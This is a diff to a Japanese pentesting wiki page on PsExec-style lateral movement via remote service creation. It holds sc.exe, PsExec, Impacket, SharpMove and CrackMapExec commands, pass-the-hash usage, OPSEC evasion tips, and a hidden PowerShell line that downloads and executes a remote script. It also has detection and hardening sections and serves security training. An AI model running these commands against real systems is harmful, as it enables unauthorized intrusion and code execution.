@@ -2,25 +2,25 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## どのように機能するか
+## どのように動作するか
 
-これらの技術は、SMB/RPCを介してリモートでWindowsサービスコントロールマネージャー（SCM）を悪用して、ターゲットホスト上でコマンドを実行します。一般的な流れは次のとおりです：
+これらの technique は、SMB/RPC 経由で Windows Service Control Manager (SCM) をリモートから悪用し、対象ホスト上でコマンドを実行します。一般的な流れは次のとおりです。
 
-1. ターゲットに認証し、SMB（TCP/445）経由でADMIN$共有にアクセスします。
-2. 実行可能ファイルをコピーするか、サービスが実行するLOLBASコマンドラインを指定します。
-3. SCM（\PIPE\svcctl経由のMS-SCMR）を介して、そのコマンドまたはバイナリを指すリモートサービスを作成します。
-4. サービスを開始してペイロードを実行し、オプションで名前付きパイプを介してstdin/stdoutをキャプチャします。
-5. サービスを停止し、クリーンアップ（サービスとドロップされたバイナリを削除）します。
+1. 対象に authenticate し、SMB (TCP/445) 経由で ADMIN$ share にアクセスする。
+2. 実行ファイルをコピーするか、service が実行する LOLBAS command line を指定する。
+3. SCM (MS-SCMR over \PIPE\svcctl) 経由で、指定した command または binary を指す service をリモートから作成する。
+4. service を開始して payload を実行し、必要に応じて named pipe 経由で stdin/stdout を取得する。
+5. service を停止して cleanup する（service と配置した binary を削除する）。
 
-要件/前提条件：
-- ターゲット上のローカル管理者（SeCreateServicePrivilege）またはターゲット上の明示的なサービス作成権限。
-- SMB（445）が到達可能で、ADMIN$共有が利用可能；ホストファイアウォールを通じてリモートサービス管理が許可されている。
-- UACリモート制限：ローカルアカウントを使用する場合、トークンフィルタリングによりネットワーク上の管理者がブロックされる可能性があるため、組み込みのAdministratorまたはLocalAccountTokenFilterPolicy=1を使用する必要があります。
-- Kerberos対NTLM：ホスト名/FQDNを使用するとKerberosが有効になり、IPで接続するとNTLMにフォールバックすることが多く（強化された環境ではブロックされる可能性があります）。
+Requirements/prereqs:
+- 対象上の Local Administrator (SeCreateServicePrivilege)、または対象上で明示的に service を作成する権限。
+- SMB (445) に到達可能で、ADMIN$ share が利用可能であること。host firewall で Remote Service Management が許可されていること。
+- UAC Remote Restrictions: local account では token filtering により、ネットワーク経由の admin access がブロックされる場合があります。これを回避するには、built-in Administrator または LocalAccountTokenFilterPolicy=1 を使用します。
+- Kerberos vs NTLM: hostname/FQDN を使用すると Kerberos が有効になります。IP で接続すると NTLM に fallback することが多く、hardened environment ではブロックされる場合があります。
 
-### sc.exeを介した手動ScExec/WinExec
+### sc.exe を使用した手動の ScExec/WinExec
 
-以下は、最小限のサービス作成アプローチを示しています。サービスイメージは、ドロップされたEXEまたはcmd.exeやpowershell.exeのようなLOLBASである可能性があります。
+以下は、最小限の service-creation approach を示しています。service image には、配置した EXE、または cmd.exe や powershell.exe のような LOLBAS を指定できます。
 ```cmd
 :: Execute a one-liner without dropping a binary
 sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
@@ -33,18 +33,18 @@ sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= de
 sc.exe \\TARGET start HTSvc
 sc.exe \\TARGET delete HTSvc
 ```
-ノート:
-- 非サービスEXEを起動するときにタイムアウトエラーが発生することがありますが、実行は続行されます。
-- OPSECに配慮するため、ファイルレスコマンド(cmd /c, powershell -enc)を好むか、ドロップされたアーティファクトを削除してください。
+注意:
+- 非サービス EXE の起動時には timeout error が発生するが、execution は実行される。
+- より OPSEC に配慮するには、fileless commands（cmd /c、powershell -enc）を優先するか、drop した artifact を削除する。
 
-詳細な手順については、こちらを参照してください: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/
+より詳細な手順は次を参照: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>
 
-## ツールと例
+## Tooling と使用例
 
 ### Sysinternals PsExec.exe
 
-- SMBを使用してADMIN$にPSEXESVC.exeをドロップし、一時サービス（デフォルト名PSEXESVC）をインストールし、名前付きパイプを介してI/Oをプロキシするクラシックな管理ツールです。
-- 使用例:
+- SMB を使用して ADMIN$ に PSEXESVC.exe を drop し、一時的な service（デフォルト名は PSEXESVC）をインストールして、named pipes 経由で I/O を proxy する classic admin tool。
+- 使用例:<sup>[[1]](#references)</sup>
 ```cmd
 :: Interactive SYSTEM shell on remote host
 PsExec64.exe -accepteula \\HOST -s -i cmd.exe
@@ -55,16 +55,16 @@ PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami 
 :: Customize the service name for OPSEC (-r)
 PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
 ```
-- WebDAV経由でSysinternals Liveから直接起動できます:
+- Sysinternals Live から WebDAV 経由で直接起動できます:
 ```cmd
 \\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
 ```
 OPSEC
-- サービスのインストール/アンインストールイベントを残し（サービス名は通常PSEXESVC、-rが使用されない限り）、実行中にC:\Windows\PSEXESVC.exeを作成します。
+- service install/uninstall events を残し（`-r` が使用されない場合、Service name は多くの場合 PSEXESVC）、実行中に `C:\Windows\PSEXESVC.exe` を作成する。
 
-### Impacket psexec.py (PsExecに似たもの)
+### Impacket psexec.py (PsExec-like)
 
-- 埋め込まれたRemComのようなサービスを使用します。ADMIN$経由で一時的なサービスバイナリ（一般的にランダム化された名前）をドロップし、サービスを作成します（デフォルトは通常RemComSvc）し、名前付きパイプを介してI/Oをプロキシします。
+- embedded RemCom-like service を使用する。ADMIN$ 経由で一時的な service binary（一般的にはランダム化された名前）を配置し、service（デフォルトでは多くの場合 RemComSvc）を作成して、named pipe 経由で I/O をプロキシする。
 ```bash
 # Password auth
 psexec.py DOMAIN/user:Password@HOST cmd.exe
@@ -79,73 +79,78 @@ psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe
 psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
 ```
 Artifacts
-- 一時的なEXEがC:\Windows\に作成されます（ランダムな8文字）。サービス名は上書きされない限り、デフォルトでRemComSvcになります。
+- C:\Windows\ に一時 EXE（ランダムな 8 文字）。Service name は、上書きされない限りデフォルトで RemComSvc。
 
 ### Impacket smbexec.py (SMBExec)
 
-- cmd.exeを生成する一時的なサービスを作成し、I/Oに名前付きパイプを使用します。一般的にフルEXEペイロードをドロップすることは避けられ、コマンド実行はセミインタラクティブです。
+- 一時 service を作成し、cmd.exe を起動して I/O に named pipe を使用する。通常、完全な EXE payload の drop を回避し、command execution は semi-interactive。
 ```bash
 smbexec.py DOMAIN/user:Password@HOST
 smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
 ```
-### SharpLateral と SharpMove
+### SharpLateral and SharpMove
 
-- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) は、サービスベースの実行を含むいくつかの横移動手法を実装しています。
+- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) は、service-based exec を含む複数の lateral movement 手法を実装しています。
 ```cmd
 SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
 ```
-- [SharpMove](https://github.com/0xthirteen/SharpMove) は、リモートでコマンドを実行するためのサービスの変更/作成を含みます。
+- [SharpMove](https://github.com/0xthirteen/SharpMove) には、リモートでコマンドを実行するためのサービスの変更/作成機能が含まれています。
 ```cmd
 SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
 SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
 ```
-- CrackMapExecを使用して、異なるバックエンド（psexec/smbexec/wmiexec）を介して実行することもできます：
+- CrackMapExecを使用して、異なるbackend（psexec/smbexec/wmiexec）経由で実行することもできます：
 ```bash
 cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
 cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
 ```
-## OPSEC、検出とアーティファクト
+## OPSEC、検知、アーティファクト
 
-PsExecのような技術を使用する際の典型的なホスト/ネットワークアーティファクト：
-- 管理者アカウントに対するセキュリティ4624（ログオンタイプ3）および4672（特権）。
-- ADMIN$アクセスおよびサービスバイナリの作成/書き込み（例：PSEXESVC.exeまたはランダムな8文字の.exe）を示すセキュリティ5140/5145ファイル共有およびファイル共有詳細イベント。
-- ターゲット上のサービスインストールに関するセキュリティ7045：PSEXESVC、RemComSvc、またはカスタム（-r / -service-name）のようなサービス名。
-- services.exeまたはサービスイメージに対するSysmon 1（プロセス作成）、C:\Windows\内の3（ネットワーク接続）、11（ファイル作成）、\\.\pipe\psexesvc、\\.\pipe\remcom_*、またはランダム化された同等物のための17/18（パイプ作成/接続）。
-- オペレータホスト上のSysinternals EULAに関するレジストリアーティファクト：HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1（抑制されていない場合）。
+PsExec-like techniques の使用時に一般的に確認されるホスト／ネットワーク・アーティファクト：
 
-ハンティングアイデア
-- ImagePathにcmd.exe /c、powershell.exe、またはTEMPロケーションを含むサービスインストールにアラートを出す。
-- ParentImageがC:\Windows\PSEXESVC.exeであるプロセス作成や、LOCAL SYSTEMとしてシェルを実行しているservices.exeの子プロセスを探す。
-- -stdin/-stdout/-stderrで終わる名前付きパイプや、よく知られたPsExecクローンパイプ名にフラグを立てる。
+- 対象上で、使用された admin account に対する Security 4624（Logon Type 3）および 4672（Special Privileges）。
+- ADMIN$ へのアクセス、および service binaries（例：PSEXESVC.exe またはランダムな 8 文字の .exe）の作成／書き込みを示す Security 5140/5145 File Share および File Share Detailed events。
+- 対象上の Security 7045 Service Install：PSEXESVC、RemComSvc、または custom（-r / -service-name）などの service names。
+- services.exe または service image に対する Sysmon 1（Process Create）、3（Network Connect）、C:\Windows\ 内の 11（File Create）、および \\.\pipe\psexesvc、\\.\pipe\remcom_*、またはランダム化された同等の pipes に対する 17/18（Pipe Created/Connected）。
+- Sysinternals EULA の Registry artifact：operator host 上の HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1（抑制されていない場合）。
 
-## 一般的な失敗のトラブルシューティング
-- サービス作成時にアクセスが拒否される（5）：真のローカル管理者でない、ローカルアカウントに対するUACリモート制限、またはサービスバイナリパスに対するEDR改ざん保護。
-- ネットワークパスが見つからない（53）またはADMIN$に接続できない：SMB/RPCをブロックするファイアウォールまたは管理共有が無効。
-- Kerberosが失敗するがNTLMがブロックされる：ホスト名/FQDN（IPではなく）を使用して接続し、適切なSPNを確保するか、Impacketを使用する際にチケットと共に-k/-no-passを供給する。
-- サービス開始がタイムアウトするがペイロードが実行された：実際のサービスバイナリでない場合は予想される；出力をファイルにキャプチャするか、ライブI/Oのためにsmbexecを使用する。
+## Hunting ideas
 
-## ハードニングノート
-- Windows 11 24H2およびWindows Server 2025は、デフォルトでアウトバウンド（およびWindows 11のインバウンド）接続に対してSMB署名を要求します。これは、正当な資格情報を持つPsExecの使用を妨げることはありませんが、署名されていないSMBリレーの悪用を防ぎ、署名をサポートしないデバイスに影響を与える可能性があります。
-- 新しいSMBクライアントのNTLMブロック（Windows 11 24H2/Server 2025）は、IPまたは非Kerberosサーバーへの接続時にNTLMフォールバックを防ぐことがあります。ハードニングされた環境では、NTLMベースのPsExec/SMBExecが壊れるため、Kerberos（ホスト名/FQDN）を使用するか、正当な必要がある場合は例外を設定してください。
-- 最小特権の原則：ローカル管理者のメンバーシップを最小限に抑え、Just-in-Time/Just-Enough Adminを優先し、LAPSを強制し、7045サービスインストールを監視/アラートします。
+- ImagePath に cmd.exe /c、powershell.exe、または TEMP locations が含まれる service installs に対して Alert を設定する。
+- ParentImage が C:\Windows\PSEXESVC.exe である process creations、または services.exe の children として LOCAL SYSTEM で実行される shells を探す。
+- -stdin/-stdout/-stderr で終わる named pipes、または既知の PsExec clone pipe names に Flag を付ける。
 
-## 参照
+## Troubleshooting common failures
 
-- WMIベースのリモート実行（しばしばファイルレス）：
+- サービス作成時の Access is denied (5)：実際には local admin ではない、local accounts に対する UAC remote restrictions、または service binary path に対する EDR tampering protection が原因。
+- The network path was not found (53)、または ADMIN$ に接続できない：firewall による SMB/RPC の blocking、または admin shares が無効化されていることが原因。
+- Kerberos は失敗するが NTLM は blocked：hostname/FQDN（IP ではない）を使用して接続し、適切な SPNs を設定するか、Impacket 使用時に tickets とともに -k/-no-pass を指定する。
+- Service start が timeout するが payload は実行された：実際の service binary ではない場合に想定される動作。output を file に capture するか、live I/O には smbexec を使用する。
+
+## Hardening notes
+
+- Windows 11 24H2 および Windows Server 2025 では、outbound（Windows 11 では inbound も）の connections に対して SMB signing が default で required となる。有効な creds を使用する legitimate な PsExec usage は壊さないが、unsigned SMB relay abuse を防止し、signing をサポートしない devices に影響する可能性がある。<sup>[[2]](#references)</sup>
+- New SMB client NTLM blocking（Windows 11 24H2/Server 2025）により、IP または non-Kerberos servers への接続時に NTLM fallback が防止される場合がある。hardened environments では、これにより NTLM-based PsExec/SMBExec が機能しなくなる。Kerberos（hostname/FQDN）を使用するか、legitimately 必要な場合は exceptions を configure する。<sup>[[2]](#references)</sup>
+- Principle of least privilege：local admin membership を最小化し、Just-in-Time/Just-Enough Admin を優先し、LAPS を enforce し、7045 service installs に対して monitor/alert を行う。
+
+## See also
+
+- WMI-based remote exec（より fileless な場合が多い）：
 
 {{#ref}}
 ./wmiexec.md
 {{#endref}}
 
-- WinRMベースのリモート実行：
+- WinRM-based remote exec：
 
 {{#ref}}
 ./winrm.md
 {{#endref}}
 
-## 参考文献
+## References
 
-- PsExec - Sysinternals | Microsoft Learn: https://learn.microsoft.com/sysinternals/downloads/psexec
-- Windows Server 2025およびWindows 11におけるSMBセキュリティハードニング（デフォルトでの署名、NTLMブロック）： https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591
+- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
+- [2] [SMB security hardening in Windows Server 2025 & Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
+- [3] [Using Credentials to Own Windows Boxes - Part 2 (PSExec and Services)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
 
 {{#include ../../banners/hacktricks-training.md}}
